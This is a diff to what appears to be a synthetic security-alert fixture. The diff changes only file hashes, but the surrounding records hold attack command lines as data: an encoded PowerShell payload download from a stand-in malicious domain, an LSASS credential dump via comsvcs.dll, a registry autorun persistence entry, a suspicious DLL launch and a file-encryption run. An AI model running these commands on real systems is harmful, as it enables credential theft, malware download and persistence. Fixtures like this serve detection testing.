@@ -12,7 +12,7 @@
     "user": "j.doe",
     "process_name": "powershell.exe",
     "command_line": "powershell.exe -e aW52b2tlLXdlYnJlcXVlc3QgaHR0cDovL21hbGljaW91cy1kb21haW4ubmV0L3BheWxvYWQuZXhl",
-    "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+    "file_hash": "71961ab144a1b3a0a452bf2b13861433ea750a028981f3efd0fc302e0ec0dabc",
     "destination_ip": "185.220.101.5",
     "description": "Encoded PowerShell execution attempting payload download from external synthetic IP.",
     "status": "NEW"
@@ -66,7 +66,7 @@
     "user": "j.doe",
     "process_name": "rundll32.exe",
     "command_line": "rundll32.exe C:\\Users\\j.doe\\AppData\\Local\\Temp\\update.dll,Start",
-    "file_hash": "2b8a741369359e19864293fe2f7cfef5f58c70425712ef9e3dfa4b13a8efee5d",
+    "file_hash": "1527175195cf32685e8703b31777c1e1a0f88c9c1d658d383ff4cfc6a14417c8",
     "destination_ip": "185.220.101.5",
     "description": "Beaconing traffic detected towards simulated command-and-control server 185.220.101.5.",
     "status": "NEW"
@@ -84,7 +84,7 @@
     "user": "s.administrator",
     "process_name": "encryptor.exe",
     "command_line": "C:\\Windows\\Temp\\encryptor.exe --dir C:\\Shares\\HR",
-    "file_hash": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+    "file_hash": "2c8dcb4cabfb4d76e27cd49c3b93515b7e5066c3ccf36704b533a13266e79771",
     "destination_ip": null,
     "description": "Over 200 files renamed with extension .locked within 10 seconds.",
     "status": "NEW"
@@ -120,7 +120,7 @@
     "user": "dev_local",
     "process_name": "comsvcs.dll",
     "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Users\\Public\\lsass.dmp full",
-    "file_hash": "c138f387a3243171350a4170e3ed510bbf49a0ec947dfeb6e5ebf8695d7eb80a",
+    "file_hash": "57cbed5ed090e11dd74a27dbc0121a098f237ff82cfca4516f016cc8b9db39f6",
     "destination_ip": null,
     "description": "Attempt to dump LSASS process memory using comsvcs.dll MiniDump module.",
     "status": "NEW"
@@ -174,7 +174,7 @@
     "user": "j.doe",
     "process_name": "reg.exe",
     "command_line": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /t REG_SZ /d C:\\Users\\j.doe\\AppData\\Local\\Temp\\update.exe /f",
-    "file_hash": "4a715f5d6f4618e47d1a293ebc52a0a2df3303d7b32230154673890f55562145",
+    "file_hash": "9e1c81740f1243f6fef46f13eaf7d5e6e2f2eb00f246b19008a9580ca155c5dc",
     "destination_ip": null,
     "description": "Registry autorun key created pointing to executable binary in user Temp folder.",
     "status": "NEW"
